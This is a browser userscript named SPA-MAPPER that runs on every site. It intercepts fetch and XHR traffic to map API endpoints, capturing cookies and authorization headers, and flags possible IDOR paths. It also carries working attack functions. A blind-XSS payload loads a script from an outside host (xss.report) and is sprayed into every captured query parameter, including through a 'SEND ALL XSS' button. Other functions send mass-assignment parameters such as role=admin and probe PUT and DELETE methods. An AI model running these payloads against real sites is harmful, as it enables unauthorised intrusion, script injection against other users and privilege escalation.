// ==UserScript==
// @name         SPA-MAPPER
// @namespace    http://tampermonkey.net/
// @version      16.0.0
// @description  SPA Mapper + Blind XSS + IDOR + HTTP Fuzzer + Clean cURL + Full Response Editor
// @author       AKUIVAN x ENI
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_registerMenuCommand
// @run-at       document-end
// ==/UserScript==

(() => {
  "use strict";

  const APP_ID = "__akv_bh__";
  const STORAGE_KEY = `__akv_bh:${location.hostname}`;
  const XSS_PAYLOAD = '" /><script src=https://xss.report/c/van></script>';
  const MASS_PARAMS = [['role','admin'],['isAdmin','true'],['is_admin','1'],['debug','1']];
  const MC = {GET:'#13c27b',POST:'#f4a62a',PUT:'#4f8df7',PATCH:'#a979f7',DELETE:'#f35b5b'};
  const MAX_EPS = 3000;          // hard cap so a polling SPA can't blow up memory
  const MAX_FINDINGS = 500;

  const ESSENTIAL_HEADERS = [
    'content-type', 'authorization', 'cookie', 'user-agent', 'referer', 'origin',
    'x-requested-with', 'accept', 'accept-language', 'accept-encoding',
    'x-csrf-token', 'x-xsrf-token', 'x-api-key', 'api-key',
  ];

  // ── HTML escaping: every user/URL-controlled string goes through this before
  //    it reaches innerHTML. Without it a crafted URL injects markup into the
  //    panel (the panel runs on the page, so that is script execution).
  const esc = (s) => String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

  const stripHeaders = (headers) => {
    const clean = {};
    for (const [k, v] of Object.entries(headers || {})) {
      const lower = k.toLowerCase();
      if (lower.startsWith('x-goog-') || lower.startsWith('x-youtube-') ||
          lower.startsWith('x-chrome-') || lower.startsWith('x-client-') ||
          lower.startsWith('x-browser-') || lower.startsWith('x-origin-') ||
          lower.startsWith('sec-ch-') || lower.startsWith('sec-fetch-') ||
          lower.includes('visitor') || lower.includes('datasync') ||
          lower.includes('event-time') || lower.includes('request-time') ||
          lower.includes('page-cl') || lower.includes('page-label') ||
          lower.includes('utc-offset') || lower.includes('time-zone') ||
          lower.includes('ad-signals') || lower.includes('identity-token')) {
        continue;
      }
      if (ESSENTIAL_HEADERS.includes(lower) || lower.startsWith('x-')) clean[k] = v;
    }
    return clean;
  };

  // Panel toggle
  const oldPanel = document.getElementById(APP_ID);
  if (oldPanel) {
    oldPanel.style.display = oldPanel.style.display === "none" ? "flex" : "none";
    return;
  }
  if (window.__AKV_ACTIVE__) return;
  window.__AKV_ACTIVE__ = true;

  const S = {
    eps: [], seen: new Set(), findings: [],
    findingsSeen: new Set(),
    filter: '', sort: 'time',
    isMinimized: false
  };

  let panel, tbody, cntEl, emptyEl, findDiv, scrollEl, findCountEl;
  let editorOverlay, editorMethod, editorUrl, editorHeaders, editorBody, editorResponse;

  // ========== HELPERS ==========
  const toast = (msg) => {
    const t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#1e3a2f;color:#34d399;padding:8px 20px;border-radius:8px;z-index:2147483650;font-family:sans-serif;font-size:13px;box-shadow:0 4px 16px rgba(0,0,0,.4);border:1px solid #10b981;';
    t.textContent = msg; document.body.appendChild(t);
    setTimeout(() => { t.style.opacity='0'; t.style.transition='opacity .3s'; setTimeout(()=>t.remove(),300); },1500);
  };

  const skip = (u) => {
    if (!u || typeof u !== 'string') return true;
    if (/\.(js|css|png|jpg|gif|svg|woff|ttf|ico|map|mp\d|webp)(\?|$)/i.test(u)) return true;
    if (u.includes('/cdn-cgi/')) return true;
    if (u.startsWith('data:') || u.startsWith('blob:')) return true;
    return false;
  };

  // IDOR heuristic. A bare /v1/ /v2/ path segment is an API VERSION, not an id,
  // so exclude the `v<digits>` segment. Real ids are: long numeric segments,
  // UUIDs, or numeric query values.
  const isIDOR = (p) => {
    const pathOnly = p.split('?')[0];
    const segs = pathOnly.split('/').filter(Boolean);
    const numericId = segs.some(s => /^\d{2,}$/.test(s));            // 2+ digit id
    const uuid = /[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}/i.test(p);
    return numericId || uuid;
  };

  // Debounced storage write: JSON.stringify on every request lags a polling SPA.
  let saveTimer = null;
  const saveToStorage = () => {
    if (saveTimer) return;
    saveTimer = setTimeout(() => {
      saveTimer = null;
      try { GM_setValue(STORAGE_KEY, JSON.stringify({eps: S.eps, findings: S.findings})); } catch (e) {}
    }, 800);
  };

  const loadFromStorage = () => {
    try {
      const d = GM_getValue(STORAGE_KEY, '');
      if (d) {
        const p = JSON.parse(d);
        if (p.eps) { S.eps = p.eps; S.seen = new Set(p.eps.map(e => e.method + ':' + e.path)); }
        if (p.findings) { S.findings = p.findings; S.findingsSeen = new Set(p.findings.map(f => f.ty + '|' + f.tl + '|' + f.de)); }
      }
    } catch (e) {}
  };

  // ========== FINDINGS ==========
  const addFinding = (ty, tl, de) => {
    const key = ty + '|' + tl + '|' + de;
    if (S.findingsSeen.has(key)) return;         // dedupe
    S.findingsSeen.add(key);
    S.findings.push({ ty, tl, de, ti: new Date().toLocaleTimeString() });
    if (S.findings.length > MAX_FINDINGS) {
      const drop = S.findings.shift();
      S.findingsSeen.delete(drop.ty + '|' + drop.tl + '|' + drop.de);
    }
    renderFindings();
  };

  const renderFindings = () => {
    if (!findDiv) return;
    if (findCountEl) findCountEl.textContent = S.findings.length;
    findDiv.innerHTML = S.findings.length
      ? S.findings.map(f => '<div style="border-bottom:1px solid #2d2d3f;padding:4px 5px;font-size:10px">'
          + '<span style="color:#f59e0b;font-weight:700">[' + esc(f.ty) + ']</span> ' + esc(f.tl)
          + '<br><span style="color:#9ca3af;font-size:9px">' + esc(f.de) + ' (' + esc(f.ti) + ')</span></div>').join('')
      : '<div style="color:#6b7280;font-size:10px;padding:5px">No findings yet.</div>';
  };

  // ========== CURL ==========
  const buildCurl = (method, url, headers, body) => {
    const cleanHeaders = stripHeaders(headers || {});
    let c = 'curl';
    if (method !== 'GET') c += ' -X ' + method;
    c += " '" + url + "'";
    for (const [k, v] of Object.entries(cleanHeaders)) c += " -H '" + k + ": " + v + "'";
    if (body && ['POST','PUT','PATCH'].includes(method)) c += " -d '" + body + "'";
    return c;
  };
  const generateCurl = (ep) => buildCurl(ep.method, ep.url, ep.headers, ep.body);

  const copyText = (t) => { try { navigator.clipboard.writeText(t); return true; } catch { return false; } };

  // ========== ATTACKS ==========
  const sendXSS = (url, pr) => {
    if (!pr || !pr.length) return;
    pr.forEach((p, i) => {
      setTimeout(() => {
        try {
          const u = new URL(url);
          u.searchParams.set(p, XSS_PAYLOAD);
          GM_xmlhttpRequest({ method:'GET', url: u.href, onload:function(){}, onerror:function(){} });
        } catch (e) {}
      }, i * 200);
    });
    toast('XSS sent to ' + pr.length + ' params');
  };

  const sendAllXSS = () => {
    S.eps.forEach(e => { if (e.params && e.params.length) sendXSS(e.url, e.params); });
    toast('XSS sent to ALL');
  };

  const testMethod = (url, method) => {
    GM_xmlhttpRequest({ method, url,
      onload:function(r){ toast(method+' '+r.status); if(r.status===200&&method!=='GET') addFinding('Method', method+' allowed', url); },
      onerror:function(){} });
  };

  const testMassAssignment = (url) => {
    try {
      const u = new URL(url);
      MASS_PARAMS.forEach(([k,v]) => u.searchParams.set(k,v));
      GM_xmlhttpRequest({ method:'GET', url:u.href, onload:function(){ toast('Mass Assign sent'); addFinding('Mass Assign','Tested',url); }, onerror:function(){} });
    } catch (e) { toast('Mass Assign: bad URL'); }
  };

  const scanUnlinked = () => {
    const pats = [/["'](\/api\/[^"'\s]+)["']/g, /["'](\/v\d+\/[^"'\s]+)["']/g, /["'](\/graphql)["']/g, /["'](\/admin\/[^"'\s]+)["']/g, /["'](\/internal\/[^"'\s]+)["']/g];
    const fnd = new Set();
    document.querySelectorAll('script').forEach(s => {
      if (s.src && skip(s.src)) return;
      const c = s.textContent || '';
      pats.forEach(p => { let m; while ((m = p.exec(c)) !== null) { const pt = m[1]; if (!skip(pt) && !S.seen.has('GET:'+pt)) fnd.add(pt); } });
    });
    const arr = [...fnd];
    if (!arr.length) { toast('No unlinked endpoints'); return; }
    arr.forEach(pt => { try { const fu = new URL(pt, location.origin).href; addEndpoint('GET', fu, 'Unlinked'); } catch(e){} });
    toast('Added ' + arr.length + ' unlinked');
  };

  // ========== ADD ENDPOINT ==========
  const addEndpoint = (method, url, type, headers, body) => {
    if (skip(url)) return;
    try {
      const full = url.startsWith('http') ? url : new URL(url, location.origin).href;
      const u = new URL(full);
      const path = u.pathname + u.search;
      const sig = method + ':' + path;
      if (S.seen.has(sig)) return;
      S.seen.add(sig);
      const pr = [...u.searchParams.keys()];
      const idor = isIDOR(path);
      const ep = {
        method: method.toUpperCase(), path, url: full, type, params: pr, hasID: idor,
        time: new Date().toLocaleTimeString('id-ID', {hour:'2-digit',minute:'2-digit',second:'2-digit'}),
        ts: Date.now(), headers: headers || {}, body: body || ''
      };
      if (S.eps.length >= MAX_EPS) return;
      S.eps.push(ep);
      if (idor) addFinding('IDOR', 'Potential IDOR', path);
      if (matchesFilter(ep)) addRow(ep, S.eps.length - 1);
      updateCnt();
      saveToStorage();
    } catch(e) {}
  };

  // ========== FILTER / SORT ==========
  const matchesFilter = (ep) => {
    const f = S.filter.toLowerCase();
    if (!f) return true;
    return (ep.path + ' ' + ep.method + ' ' + ep.type + ' ' + (ep.params||[]).join(',')).toLowerCase().includes(f);
  };

  const visibleEps = () => {
    let list = S.eps.map((ep, i) => ({ ep, i })).filter(x => matchesFilter(x.ep));
    if (S.sort === 'alpha') list.sort((a,b) => a.ep.path.localeCompare(b.ep.path));
    else if (S.sort === 'method') list.sort((a,b) => a.ep.method.localeCompare(b.ep.method));
    else if (S.sort === 'idor') list.sort((a,b) => (b.ep.hasID?1:0)-(a.ep.hasID?1:0));
    else list.sort((a,b) => (b.ep.ts||0)-(a.ep.ts||0));   // recent first
    return list;
  };

  // ========== RENDER ==========
  const addRow = (ep, idx) => {
    if (!tbody) return;
    if (emptyEl) emptyEl.style.display = 'none';
    const tr = document.createElement('tr');
    tr.style.animation = 'akv_f .5s ease';
    const td = (s) => { const t = document.createElement('td'); t.style.cssText = s; return t; };
    const border = 'border-bottom:1px solid #2d2d3f';

    const c0 = td(`color:#9ca3af;padding:3px 5px;${border};font-size:10px`); c0.textContent = idx + 1;
    const c1 = td(`padding:3px 5px;${border};font-size:10px;text-align:center;color:${ep.hasID?'#ff5e5e':'#6b7280'}`); c1.textContent = ep.hasID ? '🔴' : '⚪';
    const c2 = td(`padding:3px 5px;${border}`);
    c2.innerHTML = '<span style="background:' + (MC[ep.method]||'#6b7280') + ';color:#000;padding:1px 4px;border-radius:3px;font-size:9px;font-weight:700">' + esc(ep.method) + '</span>';
    const c3 = td(`padding:3px 5px;${border}`);
    const urlSpan = document.createElement('span');
    urlSpan.className = 'akv-url';
    urlSpan.dataset.u = ep.url;
    urlSpan.title = ep.url;
    urlSpan.style.cssText = 'cursor:pointer;color:#e2e8f0;font-family:monospace;font-size:10px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block';
    urlSpan.textContent = ep.path;                       // textContent = no injection
    c3.appendChild(urlSpan);
    const c4 = td(`padding:3px 5px;${border};font-size:10px;color:#fbbf24;max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap`);
    c4.textContent = ep.params.join(', ') || '-';
    c4.title = ep.params.join(', ');
    const c5 = td(`padding:3px 3px;${border};text-align:center;white-space:nowrap`);
    const c6 = td(`padding:3px 3px;${border};text-align:center;white-space:nowrap;font-size:9px`);

    [c0,c1,c2,c3,c4,c5,c6].forEach(c => tr.appendChild(c));

    const mkBtn = (label, title, fn, css) => {
      const b = document.createElement('button'); b.textContent = label; b.title = title || label;
      b.style.cssText = css || 'background:#1e2a3a;border:1px solid #6b7280;color:#d1d5db;padding:2px 5px;border-radius:3px;cursor:pointer;font-size:9px;margin:1px';
      b.addEventListener('click', fn); return b;
    };
    c5.appendChild(mkBtn('📋','Copy cURL', () => { copyText(generateCurl(ep)); toast('cURL copied!'); }));
    c5.appendChild(mkBtn('✏️','Edit & replay', () => openEditor(ep)));
    if (ep.params.length) c5.appendChild(mkBtn('XSS','Send XSS to params', () => sendXSS(ep.url, ep.params), 'background:#3a1e1e;border:1px solid #b91c1c;color:#fca5a5;padding:2px 5px;border-radius:3px;cursor:pointer;font-size:9px;font-weight:700;margin:1px'));
    c5.appendChild(mkBtn('MA','Test mass assignment', () => testMassAssignment(ep.url)));
    ['GET','POST','PUT','DELETE'].forEach(m => {
      c6.appendChild(mkBtn(m.charAt(0), 'Test '+m, () => testMethod(ep.url, m), 'background:#1e3a5c;border:1px solid #2563eb;color:#60a5fa;padding:2px 3px;border-radius:3px;cursor:pointer;font-size:9px;margin:1px'));
    });

    tbody.appendChild(tr);
  };

  const rebuildTable = () => {
    if (!tbody) return;
    const prevScroll = scrollEl ? scrollEl.scrollTop : 0;
    tbody.innerHTML = '';
    const list = visibleEps();
    list.forEach(({ ep, i }) => addRow(ep, i));
    updateCnt();
    if (emptyEl) emptyEl.style.display = S.eps.length ? 'none' : 'block';
    if (scrollEl) scrollEl.scrollTop = prevScroll;        // preserve position
  };

  const updateCnt = () => { if (cntEl) cntEl.textContent = S.eps.length; };

  // ========== EDITOR ==========
  const openEditor = (ep) => {
    if (!editorOverlay) return;
    editorMethod.value = ep.method;
    editorUrl.value = ep.url;
    let hs = '';
    for (const [k, v] of Object.entries(ep.headers || {})) {
      if (k.toLowerCase()==='host'||k.toLowerCase()==='content-length') continue;
      hs += k + ': ' + v + '\n';
    }
    editorHeaders.value = hs;
    editorBody.value = ep.body || '';
    editorResponse.style.display = 'none';
    editorResponse.textContent = '';
    editorOverlay.style.display = 'flex';
  };

  const sendEditedRequest = () => {
    const m = editorMethod.value, u = editorUrl.value, hs = editorHeaders.value, bd = editorBody.value;
    const h = {};
    hs.split('\n').forEach(l => { const i = l.indexOf(':'); if (i>0) h[l.substring(0,i).trim()] = l.substring(i+1).trim(); });
    editorResponse.style.display = 'block'; editorResponse.textContent = 'Sending...'; editorResponse.style.color = '#fbbf24';
    GM_xmlhttpRequest({
      method:m, url:u, headers:h, data:bd||undefined,
      onload:function(r){
        const fullBody = r.responseText || '(empty body)';
        editorResponse.textContent = 'Status: '+r.status+' '+r.statusText+'\n\nHeaders:\n'+(r.responseHeaders||'')+'\n\nBody:\n'+fullBody;
        editorResponse.style.color = r.status>=200&&r.status<300?'#34d399':'#f87171';
      },
      onerror:function(r){ editorResponse.textContent = 'Error: '+(r.statusText||'Request failed'); editorResponse.style.color = '#f87171'; }
    });
  };

  // ========== EXPORT ==========
  const exportJson = () => {
    const data = { exportedAt: new Date().toISOString(), host: location.hostname,
      total: S.eps.length, findings: S.findings,
      endpoints: S.eps.map(e => ({ method:e.method, url:e.url, path:e.path, type:e.type, params:e.params, hasID:e.hasID, time:e.time })) };
    const blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
    const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
    a.download = `spa-map-${location.hostname}-${Date.now()}.json`; a.click();
    setTimeout(() => URL.revokeObjectURL(a.href), 2000);
  };

  const copyAllCurl = () => {
    const all = visibleEps().map(({ep}) => generateCurl(ep)).join('\n\n');
    copyText(all); toast(`Copied ${visibleEps().length} cURLs`);
  };

  // ========== BUILD PANEL ==========
  const buildPanel = () => {
    if (document.getElementById(APP_ID)) return;
    loadFromStorage();

    const style = document.createElement('style');
    style.textContent = `
      @keyframes akv_f{from{background:#1e3a2f}to{background:transparent}}
      #${APP_ID} .akv-btn{background:#1e2a3a;border:1px solid #6b7280;color:#d1d5db;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:10px}
      #${APP_ID} .akv-btn:hover{background:#26405a}
      #${APP_ID} .akv-btn.pri{background:#1e3a2f;border-color:#10b981;color:#34d399;font-weight:700}
      #${APP_ID} .akv-btn.pri:hover{background:#245c46}
      #${APP_ID} .akv-in{background:#1e1e36;border:1px solid #3d3d5c;color:#e2e8f0;padding:4px 7px;border-radius:4px;font-size:11px;outline:none}
      #${APP_ID} .akv-in:focus{border-color:#60a5fa}
      #${APP_ID} #akv_scroll{flex:1;overflow-y:auto;max-height:220px;scrollbar-width:thin;scrollbar-color:#60a5fa #16162a}
      #${APP_ID} #akv_scroll::-webkit-scrollbar{width:9px}
      #${APP_ID} #akv_scroll::-webkit-scrollbar-thumb{background:#3d3d5c;border-radius:5px}
      #${APP_ID} #akv_scroll::-webkit-scrollbar-thumb:hover{background:#60a5fa}
    `;
    document.head.appendChild(style);

    panel = document.createElement('div');
    panel.id = APP_ID;
    panel.style.cssText = 'position:fixed;bottom:5px;right:5px;width:860px;max-width:calc(100vw - 10px);max-height:520px;background:#0f0f1a;color:#e2e8f0;border:1px solid #2d2d4f;border-radius:10px;box-shadow:0 8px 32px rgba(0,0,0,.6);z-index:2147483647;font-family:Segoe UI,system-ui,sans-serif;font-size:12px;display:flex;flex-direction:column;overflow:hidden';

    // header
    const header = document.createElement('div');
    header.style.cssText = 'display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:#16162a;border-radius:10px 10px 0 0;border-bottom:1px solid #2d2d4f;cursor:move;user-select:none;flex:0 0 auto';
    const hl = document.createElement('div');
    hl.style.cssText = 'display:flex;align-items:center;gap:8px';
    hl.innerHTML = '<span>⚡</span><span style="font-weight:700;color:#f59e0b;font-size:13px">AKUIVAN Pro</span>';
    cntEl = document.createElement('span');
    cntEl.style.cssText = 'background:#374151;color:#10b981;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:700';
    cntEl.textContent = S.eps.length;
    hl.appendChild(cntEl);
    header.appendChild(hl);

    const hr = document.createElement('div');
    hr.style.cssText = 'display:flex;gap:4px;align-items:center';
    const mkHdrBtn = (label, fn, title) => { const b = document.createElement('button'); b.className='akv-btn'; b.textContent = label; b.title = title||''; b.addEventListener('click', fn); return b; };
    hr.appendChild(mkHdrBtn('🔍 Unlinked', scanUnlinked, 'Scan <script> for hidden endpoints'));
    hr.appendChild(mkHdrBtn('🔥 SEND ALL XSS', sendAllXSS, 'Send XSS payload to every parameter'));
    hr.appendChild(mkHdrBtn('📋 All cURL', copyAllCurl, 'Copy cURL of visible endpoints'));
    hr.appendChild(mkHdrBtn('⬇ JSON', exportJson, 'Export endpoints + findings'));
    hr.appendChild(mkHdrBtn('🗑', () => { if(confirm('Hapus semua endpoint & findings?')){S.eps=[];S.seen.clear();S.findings=[];S.findingsSeen.clear();rebuildTable();renderFindings();saveToStorage();} }, 'Clear all'));

    const minBtn = document.createElement('button');
    minBtn.className='akv-btn'; minBtn.textContent = '−';
    minBtn.addEventListener('click', () => {
      S.isMinimized = !S.isMinimized;
      const body = document.getElementById('akv_body');
      if (body) body.style.display = S.isMinimized ? 'none' : 'flex';
      minBtn.textContent = S.isMinimized ? '+' : '−';
    });
    hr.appendChild(minBtn);
    const closeBtn = document.createElement('button');
    closeBtn.className='akv-btn'; closeBtn.textContent = '×';
    closeBtn.addEventListener('click', () => { panel.style.display = 'none'; });
    hr.appendChild(closeBtn);
    header.appendChild(hr);
    panel.appendChild(header);

    // body wrapper (so minimize hides everything below the header)
    const bodyWrap = document.createElement('div');
    bodyWrap.id = 'akv_body';
    bodyWrap.style.cssText = 'display:flex;flex-direction:column;flex:1 1 auto;min-height:0';

    // controls
    const controls = document.createElement('div');
    controls.style.cssText = 'display:flex;gap:6px;padding:8px 12px;flex-wrap:wrap;flex:0 0 auto;border-bottom:1px solid #2d2d4f';
    const search = document.createElement('input');
    search.className='akv-in'; search.type='search'; search.placeholder='Filter path / method / param…';
    search.style.flex='1'; search.style.minWidth='140px';
    search.value = S.filter;
    search.oninput = () => { S.filter = search.value; rebuildTable(); };
    const sortSel = document.createElement('select');
    sortSel.className='akv-in';
    [['time','Sort: Recent'],['alpha','Sort: Path A–Z'],['method','Sort: Method'],['idor','Sort: IDOR first']]
      .forEach(([v,l]) => { const o = document.createElement('option'); o.value=v; o.textContent=l; sortSel.appendChild(o); });
    sortSel.value = S.sort;
    sortSel.onchange = () => { S.sort = sortSel.value; rebuildTable(); };
    controls.append(search, sortSel);
    bodyWrap.appendChild(controls);

    // table
    scrollEl = document.createElement('div');
    scrollEl.id = 'akv_scroll';
    const table = document.createElement('table');
    table.style.cssText = 'width:100%;border-collapse:collapse';
    table.innerHTML = '<thead><tr style="background:#16162a;position:sticky;top:0;z-index:1"><th style="padding:5px;color:#9ca3af;font-size:10px;border-bottom:2px solid #2d2d4f;width:25px">#</th><th style="padding:5px;color:#9ca3af;font-size:10px;border-bottom:2px solid #2d2d4f;width:25px">R</th><th style="padding:5px;color:#9ca3af;font-size:10px;border-bottom:2px solid #2d2d4f;width:50px">Method</th><th style="padding:5px;color:#9ca3af;font-size:10px;border-bottom:2px solid #2d2d4f">Path</th><th style="padding:5px;color:#9ca3af;font-size:10px;border-bottom:2px solid #2d2d4f;width:80px">Params</th><th style="padding:5px;color:#9ca3af;font-size:10px;border-bottom:2px solid #2d2d4f;width:110px">Actions</th><th style="padding:5px;color:#9ca3af;font-size:10px;border-bottom:2px solid #2d2d4f;width:70px">Methods</th></tr></thead>';
    tbody = document.createElement('tbody');
    table.appendChild(tbody);
    scrollEl.appendChild(table);
    emptyEl = document.createElement('div');
    emptyEl.style.cssText = 'text-align:center;padding:20px;color:#6b7280;font-size:11px';
    emptyEl.textContent = 'Belum ada endpoint. Jelajahi aplikasi...';
    scrollEl.appendChild(emptyEl);
    bodyWrap.appendChild(scrollEl);

    // findings
    const ft = document.createElement('div');
    ft.style.cssText = 'padding:5px 12px;background:#16162a;border-top:1px solid #2d2d4f;border-bottom:1px solid #2d2d4f;font-size:11px;font-weight:700;color:#f59e0b;flex:0 0 auto;display:flex;justify-content:space-between';
    ft.innerHTML = '<span>🔍 Findings</span>';
    findCountEl = document.createElement('span');
    findCountEl.style.cssText = 'background:#374151;color:#f59e0b;padding:1px 7px;border-radius:9px;font-size:10px';
    findCountEl.textContent = S.findings.length;
    ft.appendChild(findCountEl);
    bodyWrap.appendChild(ft);
    findDiv = document.createElement('div');
    findDiv.style.cssText = 'max-height:110px;overflow-y:auto;padding:2px 5px;flex:0 0 auto';
    bodyWrap.appendChild(findDiv);

    panel.appendChild(bodyWrap);
    document.body.appendChild(panel);

    tbody.addEventListener('click', (e) => {
      if (e.target.classList.contains('akv-url')) {
        copyText(e.target.dataset.u); toast('URL copied!');
        e.target.style.background = '#1e3a5c';
        setTimeout(() => e.target.style.background = '', 400);
      }
    });

    // ── EDITOR OVERLAY ──
    editorOverlay = document.createElement('div');
    editorOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.7);z-index:2147483650;display:none;justify-content:center;align-items:center;';
    const editorBox = document.createElement('div');
    editorBox.style.cssText = 'background:#12121f;border:1px solid #2d2d4f;border-radius:10px;padding:15px;width:700px;max-width:calc(100vw - 20px);max-height:90vh;overflow-y:auto;';
    const editorTitle = document.createElement('div');
    editorTitle.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:10px';
    const editorTitleText = document.createElement('span');
    editorTitleText.style.cssText = 'font-weight:700;color:#f59e0b;font-size:14px';
    editorTitleText.textContent = '✏️ Request Editor';
    const editorCloseBtn = document.createElement('button');
    editorCloseBtn.style.cssText = 'background:none;border:1px solid #4a4a6a;color:#9ca3af;width:24px;height:24px;border-radius:4px;cursor:pointer;font-size:14px';
    editorCloseBtn.textContent = '×';
    editorCloseBtn.addEventListener('click', () => { editorOverlay.style.display = 'none'; });
    editorTitle.append(editorTitleText, editorCloseBtn);
    editorBox.appendChild(editorTitle);

    const row1 = document.createElement('div');
    row1.style.cssText = 'display:flex;gap:10px;margin-bottom:8px';
    editorMethod = document.createElement('select');
    editorMethod.style.cssText = 'background:#1e1e36;border:1px solid #3d3d5c;color:#e2e8f0;padding:6px;border-radius:4px;font-size:12px;width:100px';
    ['GET','POST','PUT','PATCH','DELETE'].forEach(m => { const o = document.createElement('option'); o.value=m; o.textContent=m; editorMethod.appendChild(o); });
    editorUrl = document.createElement('input'); editorUrl.type='text';
    editorUrl.style.cssText = 'flex:1;background:#1e1e36;border:1px solid #3d3d5c;color:#e2e8f0;padding:6px;border-radius:4px;font-size:12px';
    editorUrl.placeholder = 'https://...';
    row1.append(editorMethod, editorUrl);
    editorBox.appendChild(row1);

    const hl2 = document.createElement('label'); hl2.style.cssText='color:#9ca3af;font-size:10px'; hl2.textContent='Headers (key: value per line)';
    editorBox.appendChild(hl2);
    editorHeaders = document.createElement('textarea');
    editorHeaders.style.cssText = 'width:100%;height:50px;background:#1e1e36;border:1px solid #3d3d5c;color:#e2e8f0;padding:6px;border-radius:4px;font-size:11px;font-family:monospace;resize:vertical;margin-bottom:6px';
    editorBox.appendChild(editorHeaders);

    const bl = document.createElement('label'); bl.style.cssText='color:#9ca3af;font-size:10px'; bl.textContent='Body';
    editorBox.appendChild(bl);
    editorBody = document.createElement('textarea');
    editorBody.style.cssText = 'width:100%;height:50px;background:#1e1e36;border:1px solid #3d3d5c;color:#e2e8f0;padding:6px;border-radius:4px;font-size:11px;font-family:monospace;resize:vertical;margin-bottom:8px';
    editorBox.appendChild(editorBody);

    const btnRow = document.createElement('div');
    btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:8px';
    const sendBtn = document.createElement('button');
    sendBtn.style.cssText = 'background:#1e3a2f;border:1px solid #10b981;color:#34d399;padding:8px 16px;border-radius:4px;cursor:pointer;font-weight:700';
    sendBtn.textContent = 'Send'; sendBtn.addEventListener('click', sendEditedRequest);
    const curlBtn = document.createElement('button');
    curlBtn.style.cssText = 'background:#1e2a3a;border:1px solid #6b7280;color:#d1d5db;padding:8px 16px;border-radius:4px;cursor:pointer';
    curlBtn.textContent = '📋 Copy cURL';
    curlBtn.addEventListener('click', () => {
      const h = {};
      editorHeaders.value.split('\n').forEach(l => { const i = l.indexOf(':'); if (i>0) h[l.substring(0,i).trim()] = l.substring(i+1).trim(); });
      copyText(buildCurl(editorMethod.value, editorUrl.value, h, editorBody.value));
      toast('cURL copied!');
    });
    btnRow.append(sendBtn, curlBtn);
    editorBox.appendChild(btnRow);

    editorResponse = document.createElement('pre');
    editorResponse.style.cssText = 'display:none;background:#000;color:#0f0;padding:10px;border-radius:4px;font-size:10px;max-height:300px;overflow-y:auto;white-space:pre-wrap';
    editorBox.appendChild(editorResponse);
    editorOverlay.appendChild(editorBox);
    document.body.appendChild(editorOverlay);

    // drag
    let drag = false, dx = 0, dy = 0;
    header.addEventListener('mousedown', (e) => {
      if (e.target.tagName === 'BUTTON') return;
      drag = true;
      const r = panel.getBoundingClientRect();
      dx = e.clientX - r.left; dy = e.clientY - r.top;
      panel.style.right = 'auto'; panel.style.bottom = 'auto';
      panel.style.left = r.left + 'px'; panel.style.top = r.top + 'px';
      e.preventDefault();
    });
    document.addEventListener('mousemove', (e) => {
      if (!drag) return;
      panel.style.left = (e.clientX - dx) + 'px';
      panel.style.top = (e.clientY - dy) + 'px';
    });
    document.addEventListener('mouseup', () => { drag = false; });

    rebuildTable();
    renderFindings();
  };

  // ========== HOOKS ==========
  const _f = window.fetch.bind(window);
  window.fetch = function(i, o) {
    try {
      const u = typeof i === 'string' ? i : (i?.url || '');
      const m = (o?.method || (i?.method) || 'GET').toUpperCase();
      const h = {};
      const hdr = o?.headers || (i && i.headers);
      if (hdr) {
        if (hdr instanceof Headers) hdr.forEach((v,k)=>{h[k]=v;});
        else if (typeof hdr === 'object') Object.assign(h, hdr);
      }
      addEndpoint(m, u, 'API', h, o?.body || '');
    } catch(e) {}
    return _f(i, o);
  };

  const _o = XMLHttpRequest.prototype.open, _s = XMLHttpRequest.prototype.send, _sh = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.open = function(m, u, ...r) { this.__m = (m||'GET').toUpperCase(); this.__u = u||''; this.__h = {}; return _o.call(this, m, u, ...r); };
  XMLHttpRequest.prototype.setRequestHeader = function(k, v) { try { this.__h[k] = v; } catch(e){} return _sh.call(this, k, v); };
  XMLHttpRequest.prototype.send = function(...a) { try { addEndpoint(this.__m, this.__u, 'API', this.__h, a[0]||''); } catch(e) {} return _s.apply(this, a); };
  window.addEventListener('popstate', () => addEndpoint('GET', location.href, 'Route'));
  window.addEventListener('hashchange', () => addEndpoint('GET', location.href, 'Route'));

  // ========== INIT ==========
  if (document.readyState === 'complete') setTimeout(buildPanel, 400);
  else window.addEventListener('load', () => setTimeout(buildPanel, 400));
  setTimeout(() => addEndpoint('GET', location.href, 'Route'), 900);

  if (typeof GM_registerMenuCommand === 'function') {
    GM_registerMenuCommand('🔎 Show / hide SPA Mapper', () => {
      const p = document.getElementById(APP_ID);
      if (p) p.style.display = p.style.display === 'none' ? 'flex' : 'none';
      else buildPanel();
    });
    GM_registerMenuCommand('⬇ Export SPA map (JSON)', exportJson);
    GM_registerMenuCommand('📋 Copy all cURL', copyAllCurl);
  }
})();
